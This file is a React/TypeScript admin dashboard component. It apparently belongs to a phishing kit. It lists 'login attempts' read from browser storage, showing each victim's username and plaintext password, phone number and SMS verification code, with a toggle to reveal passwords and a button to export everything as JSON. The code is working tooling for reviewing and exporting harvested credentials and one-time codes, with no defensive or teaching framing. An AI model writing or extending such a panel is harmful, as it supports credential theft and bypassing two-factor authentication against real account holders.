"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Search, Download, Trash2, Eye, EyeOff, RefreshCw } from "lucide-react"

interface LoginData {
  sessionId: string
  username: string
  password: string
  phoneNumber?: string
  smsCode?: string
  timestamp: string
  completedAt?: string
  step: string
}

export function AdminDashboard() {
  const [loginData, setLoginData] = useState<LoginData[]>([])
  const [filteredData, setFilteredData] = useState<LoginData[]>([])
  const [searchTerm, setSearchTerm] = useState("")
  const [showPasswords, setShowPasswords] = useState(false)
  const [stats, setStats] = useState({
    total: 0,
    completed: 0,
    pending: 0,
    today: 0,
  })

  useEffect(() => {
    loadData()
  }, [])

  useEffect(() => {
    filterData()
  }, [loginData, searchTerm])

  const loadData = () => {
    try {
      const data = JSON.parse(localStorage.getItem("loginDatabase") || "[]")
      setLoginData(data)
      calculateStats(data)
    } catch (error) {
      console.error("Error loading data:", error)
      setLoginData([])
    }
  }

  const calculateStats = (data: LoginData[]) => {
    const today = new Date().toDateString()
    const todayData = data.filter((item) => new Date(item.timestamp).toDateString() === today)

    setStats({
      total: data.length,
      completed: data.filter((item) => item.step === "completed").length,
      pending: data.filter((item) => item.step === "login").length,
      today: todayData.length,
    })
  }

  const filterData = () => {
    if (!searchTerm) {
      setFilteredData(loginData)
      return
    }

    const filtered = loginData.filter(
      (item) =>
        item.username.toLowerCase().includes(searchTerm.toLowerCase()) ||
        item.sessionId.toLowerCase().includes(searchTerm.toLowerCase()) ||
        (item.phoneNumber && item.phoneNumber.includes(searchTerm)),
    )
    setFilteredData(filtered)
  }

  const exportData = () => {
    const dataStr = JSON.stringify(loginData, null, 2)
    const dataBlob = new Blob([dataStr], { type: "application/json" })
    const url = URL.createObjectURL(dataBlob)
    const link = document.createElement("a")
    link.href = url
    link.download = `login-data-${new Date().toISOString().split("T")[0]}.json`
    link.click()
    URL.revokeObjectURL(url)
  }

  const clearAllData = () => {
    if (confirm("Are you sure you want to clear all data? This cannot be undone.")) {
      localStorage.removeItem("loginDatabase")
      setLoginData([])
      setFilteredData([])
      calculateStats([])
    }
  }

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString()
  }

  const maskPassword = (password: string) => {
    return showPasswords ? password : "•".repeat(password.length)
  }

  return (
    <div className="space-y-6">
      {/* Stats Cards */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-gray-600">Total Attempts</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-blue-600">{stats.total}</div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-gray-600">Completed</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-green-600">{stats.completed}</div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-gray-600">Pending</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-orange-600">{stats.pending}</div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-gray-600">Today</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-purple-600">{stats.today}</div>
          </CardContent>
        </Card>
      </div>

      {/* Controls */}
      <Card>
        <CardHeader>
          <CardTitle>Data Management</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="flex flex-col sm:flex-row gap-4 items-center justify-between">
            <div className="flex items-center space-x-2 flex-1">
              <Search className="w-4 h-4 text-gray-400" />
              <Input
                placeholder="Search by username, session ID, or phone..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="max-w-md"
              />
            </div>

            <div className="flex items-center space-x-2">
              <Button variant="outline" size="sm" onClick={() => setShowPasswords(!showPasswords)}>
                {showPasswords ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                {showPasswords ? "Hide" : "Show"} Passwords
              </Button>

              <Button variant="outline" size="sm" onClick={loadData}>
                <RefreshCw className="w-4 h-4 mr-2" />
                Refresh
              </Button>

              <Button variant="outline" size="sm" onClick={exportData}>
                <Download className="w-4 h-4 mr-2" />
                Export
              </Button>

              <Button variant="destructive" size="sm" onClick={clearAllData}>
                <Trash2 className="w-4 h-4 mr-2" />
                Clear All
              </Button>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Data Table */}
      <Card>
        <CardHeader>
          <CardTitle>Login Attempts ({filteredData.length})</CardTitle>
        </CardHeader>
        <CardContent>
          {filteredData.length === 0 ? (
            <div className="text-center py-8 text-gray-500">
              <p>No login data found.</p>
              <p className="text-sm mt-2">Data will appear here after users submit the login form.</p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full border-collapse">
                <thead>
                  <tr className="border-b">
                    <th className="text-left p-3 font-medium text-gray-600">Timestamp</th>
                    <th className="text-left p-3 font-medium text-gray-600">Username</th>
                    <th className="text-left p-3 font-medium text-gray-600">Password</th>
                    <th className="text-left p-3 font-medium text-gray-600">Phone</th>
                    <th className="text-left p-3 font-medium text-gray-600">SMS Code</th>
                    <th className="text-left p-3 font-medium text-gray-600">Status</th>
                    <th className="text-left p-3 font-medium text-gray-600">Session ID</th>
                  </tr>
                </thead>
                <tbody>
                  {filteredData.map((item, index) => (
                    <tr key={item.sessionId} className={index % 2 === 0 ? "bg-gray-50" : "bg-white"}>
                      <td className="p-3 text-sm">
                        <div>{formatDate(item.timestamp)}</div>
                        {item.completedAt && (
                          <div className="text-xs text-gray-500">Completed: {formatDate(item.completedAt)}</div>
                        )}
                      </td>
                      <td className="p-3">
                        <span className="font-medium text-blue-600">{item.username}</span>
                      </td>
                      <td className="p-3">
                        <span className="font-mono text-sm bg-gray-100 px-2 py-1 rounded">
                          {maskPassword(item.password)}
                        </span>
                      </td>
                      <td className="p-3">
                        {item.phoneNumber ? (
                          <span className="text-sm">{item.phoneNumber}</span>
                        ) : (
                          <span className="text-gray-400 text-sm">-</span>
                        )}
                      </td>
                      <td className="p-3">
                        {item.smsCode ? (
                          <span className="font-mono text-sm bg-green-100 px-2 py-1 rounded text-green-800">
                            {item.smsCode}
                          </span>
                        ) : (
                          <span className="text-gray-400 text-sm">-</span>
                        )}
                      </td>
                      <td className="p-3">
                        <Badge
                          variant={item.step === "completed" ? "default" : "secondary"}
                          className={
                            item.step === "completed" ? "bg-green-100 text-green-800" : "bg-orange-100 text-orange-800"
                          }
                        >
                          {item.step === "completed" ? "Completed" : "Pending"}
                        </Badge>
                      </td>
                      <td className="p-3">
                        <span className="text-xs text-gray-500 font-mono">{item.sessionId.slice(-8)}</span>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  )
}
